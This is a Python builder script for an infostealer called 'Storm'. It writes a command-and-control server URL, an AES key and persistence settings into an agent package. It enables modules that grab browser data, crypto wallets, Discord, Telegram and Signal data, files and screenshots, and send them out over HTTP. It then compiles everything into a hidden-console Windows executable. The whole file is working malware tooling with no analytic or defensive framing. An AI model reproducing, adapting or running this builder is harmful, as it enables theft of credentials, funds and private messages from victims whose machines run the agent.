#!/usr/bin/env python3
import os
import json
import uuid
import base64
import shutil
import subprocess
import sys
from pathlib import Path


AGENT_DIR = Path(__file__).parent.parent / "agent"


def generate_aes_key() -> str:
    return base64.b64encode(uuid.uuid4().bytes * 2).decode()[:32]


def build_config(server_url: str, install_token: str = "", proxy: str = "", persistence: bool = True, modules: dict = None) -> dict:
    return {
        "server_url": server_url.rstrip("/"),
        "install_token": install_token or str(uuid.uuid4()),
        "aes_key": generate_aes_key(),
        "proxy": proxy or "",
        "socks5": "",
        "google_refresh_token": "",
        "persistence": persistence,
        "run_once": False,
        "modules": modules or {"browsers": True, "wallets": True, "messengers": True, "files": True, "screenshots": True},
    }


def build_agent(config: dict, output_dir: str = "build") -> str:
    os.makedirs(output_dir, exist_ok=True)

    agent_out = os.path.join(output_dir, "agent")
    if os.path.exists(agent_out):
        shutil.rmtree(agent_out)
    shutil.copytree(str(AGENT_DIR), agent_out)

    config_json = json.dumps(config, separators=(",", ":"))

    main_path = os.path.join(agent_out, "main.py")
    with open(main_path) as f:
        code = f.read()

    inject = (
        "import os, sys\n"
        f"sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))\n"
        f"os.environ['STORM_CONFIG'] = '''{config_json}'''\n"
    )
    code = inject + "\n" + code.lstrip()

    with open(main_path, "w") as f:
        f.write(code)

    print(f"[+] Agent package built at {agent_out}")
    return agent_out


def build_exe(agent_dir: str, output_dir: str = "build"):
    out = os.path.join(output_dir, "dist")
    cmd = [
        sys.executable, "-m", "PyInstaller",
        "--onefile",
        "--noconsole",
        "--distpath", out,
        "--specpath", output_dir,
        "--workpath", os.path.join(output_dir, "work"),
        "--paths", agent_dir,
        "--hidden-import", "config",
        "--hidden-import", "browser.chromium",
        "--hidden-import", "browser.gecko",
        "--hidden-import", "crypto.wallets",
        "--hidden-import", "messengers.discord",
        "--hidden-import", "messengers.telegram",
        "--hidden-import", "messengers.signal",
        "--hidden-import", "grabber.files",
        "--hidden-import", "grabber.screenshot",
        "--hidden-import", "crypt.aes",
        "--hidden-import", "exfil.http",
        "--hidden-import", "cryptography.hazmat.primitives.ciphers",
        "--hidden-import", "cryptography.hazmat.primitives.padding",
        "--hidden-import", "win32crypt",
        "--name", "storm_agent",
        os.path.join(agent_dir, "main.py"),
    ]
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
    if result.returncode == 0:
        print(f"[+] EXE built: {os.path.join(out, 'storm_agent.exe')}")
    else:
        print(f"[-] Build failed:\n{result.stderr}")


def main():
    import argparse
    parser = argparse.ArgumentParser(description="Storm Hybrid Builder")
    parser.add_argument("--server", required=True, help="C2 server URL (https://host:port)")
    parser.add_argument("--token", default="", help="Install token")
    parser.add_argument("--proxy", default="", help="HTTPS proxy for exfil")
    parser.add_argument("--no-persist", action="store_true", help="Disable persistence")
    parser.add_argument("--exe", action="store_true", help="Build EXE with PyInstaller")
    parser.add_argument("--output", default="build", help="Output directory")
    args = parser.parse_args()

    config = build_config(
        server_url=args.server,
        install_token=args.token,
        proxy=args.proxy,
        persistence=not args.no_persist,
    )

    print(f"[+] Config:\n{json.dumps(config, indent=2)}")

    config_path = os.path.join(args.output, "config.json")
    os.makedirs(args.output, exist_ok=True)
    with open(config_path, "w") as f:
        json.dump(config, f, indent=2)
    print(f"[+] Config saved to {config_path}")

    agent_dir = build_agent(config, args.output)

    if args.exe:
        build_exe(agent_dir, args.output)

    print("[+] Build complete")


if __name__ == "__main__":
    main()
